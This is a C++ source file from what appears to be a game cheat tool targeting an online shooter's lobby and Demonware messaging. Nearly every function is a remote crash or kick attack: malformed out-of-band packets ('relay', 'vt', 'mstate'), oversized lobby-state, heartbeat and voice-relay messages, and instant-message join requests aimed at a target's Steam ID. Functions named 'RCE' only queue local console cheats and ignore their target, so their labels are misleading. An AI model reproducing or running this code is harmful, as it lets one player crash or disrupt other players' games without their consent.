#include "exploit.hpp"

namespace exploit
{
	//OOB KICK / CRASHES

	void rcon(const netadr_t& to)
	{
		send_oob(to, "rcon\n");
	}

	//

	void mdata(const netadr_t& to)
	{
		send_oob(to, "mdata\n");
	}

	//

	void mhead(const netadr_t& to)
	{
		send_oob(to, "mhead\n");
	}

	//

	void mstate(const netadr_t& to)
	{
		send_oob(to, "mstate\n");
	}

	//
	
	void send_connect_response_migration_packet(const netadr_t& to)
	{
		send_oob(to, "connectResponseMigration");
	}

	//

	void send_mstart_packet(const netadr_t& to)
	{
		send_oob(to, "mstart");
	}

	//

	void send_request_stats_packet(const netadr_t& to)
	{
		send_oob(to, "requeststats\n");
	}

	//

	void send_relay_crash(const netadr_t& to)
	{
		send_oob(to, "relay\n");
	}

	//

	void send_vt_crash(const netadr_t& to)
	{
		send_oob(to, "vt\n");
	}

	//

	void send_v_crash(const netadr_t& to)
	{
		send_oob(to, "v\n");
	}

	// LOBBY STATE / TRANSPORT

	void send_stats_crash(const netadr_t& to)
	{
		LobbyClientMsg_SendModifiedStats(0, 1);
	}

	//

	void send_lobby_transport_crash(__int64 xuid, const netadr_t to)
	{
		char lobbyMsgOOB[0x20000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
		LobbyMsgTransport_SendToAdr(0, 11, LobbyModule::LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
	}

	//

	void send_lobby_state_crash(__int64 xuid, const netadr_t to)
	{
		char lobbyMsgOOB[0x20000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20000, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
		LobbyMsgTransport_SendToAdr(0, 11, LobbyModule::LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
	}

	//

	void send_heartbeat_crash(__int64 xuid, const netadr_t to)
	{
		char lobbyMsgOOB[0x70000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x70000, MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
		LobbyMsgTransport_SendToAdr(0, 7, LobbyModule::LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT);
	}

	//

	void send_VOICE_RELAY_PACKET(__int64 xuid, const netadr_t to)
	{
		char lobbyMsgOOB[0x11000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x1F, MESSAGE_TYPE_VOICE_RELAY_PACKET);
		LobbyMsgTransport_SendToAdr(0, 1, LobbyModule::LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_VOICE_RELAY_PACKET);
	}

	//

	void send_MESSAGE_TYPE_DEMO_STATE(__int64 xuid, const netadr_t to)
	{
		char lobbyMsgOOB[0x60000]{};
		LobbyMsg lm{};
		LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, 0x20, MESSAGE_TYPE_DEMO_STATE);
		LobbyMsgTransport_SendToAdr(0, 20, LobbyModule::LOBBY_MODULE_CLIENT, to, xuid, (msg_t*)&lm, MESSAGE_TYPE_DEMO_STATE);
	}

	// IM CRASH / POPUP

	void send_crash(const std::uint64_t target_steam_id)
	{
		if (!Live_IsUserSignedInToDemonware(0))
			return;

		const JoinSessionMessage message{ JOIN_REQUEST };
		dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, sizeof message);
	}

	//

	void send_popup(const std::uint64_t target_steam_id)
	{
		if (!Live_IsUserSignedInToDemonware(0))
			return;

		const JoinSessionMessage message{ JOIN_REPLY };
		dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
	}

	void RCEGOD(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "god");
	}

	void RCENOCLIP(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "noclip");
	}

	void RCESUPERSPEED(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "g_speed 500");
	}

	void RCEAMMO(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "give ammo");
	}

	void RCEMINIGUN(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "give minigun");
	}

	void RCERESTART(const std::uint64_t target_steam_id)
	{
		Cbuf_AddText(0, "fast_restart");
	}
}